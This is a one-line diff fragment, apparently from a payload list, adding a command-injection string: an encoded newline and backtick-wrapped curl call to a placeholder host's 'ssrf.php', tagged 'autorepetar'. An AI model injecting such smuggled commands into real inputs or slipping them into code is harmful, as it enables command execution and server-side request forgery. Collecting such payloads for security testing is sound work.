@@ -1,0 +1,1 @@
+%0a`curl%20https://ip/ssrf.php?url=1` => autorepetar
